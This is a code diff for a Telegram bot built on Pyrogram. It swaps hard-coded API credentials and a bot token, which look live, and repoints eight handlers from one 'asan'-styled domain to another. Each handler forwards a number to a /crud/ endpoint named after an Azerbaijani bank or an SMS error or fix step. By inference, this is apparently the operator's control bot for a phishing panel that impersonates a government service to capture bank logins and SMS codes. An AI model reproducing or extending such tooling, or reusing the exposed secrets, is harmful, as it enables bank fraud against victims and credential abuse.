@@ -5,9 +5,9 @@ from pyrogram import Client, filters
 
 
 
-API_ID = 21220128
-API_HASH = "12c6fb5b2392354054cde4c3f338fa6a"
-BOT_TOKEN = "asdas:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw"
+API_ID = 29282726
+API_HASH = "f782e7ddda749340a2bb25d0dad2e692"
+BOT_TOKEN = "5870042232:AAFHx7Av2vHBsPHxWmAVO4amSE-PIuMAudw"
 
 
 
@@ -17,7 +17,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/kapital/{number}/"
+        url = f"https://asan-edv.net/crud/kapital/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -33,7 +33,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/abb/{number}/"
+        url = f"https://asan-edv.net/crud/abb/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -49,7 +49,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/smserror/{number}/"
+        url = f"https://asan-edv.net/crud/smserror/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -65,7 +65,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/smsfix/{number}/"
+        url = f"https://asan-edv.net/crud/smsfix/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -80,7 +80,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/leobank/{number}/"
+        url = f"https://asan-edv.net/crud/leobank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -95,7 +95,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/unibank/{number}/"
+        url = f"https://asan-edv.net/crud/unibank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -111,7 +111,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/leobank/{number}/"
+        url = f"https://asan-edv.net/crud/leobank/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -127,7 +127,7 @@ def kapital(client, message):
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asan-cerime.net/crud/pasha/{number}/"
+        url = f"https://asan-edv.net/crud/pasha/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
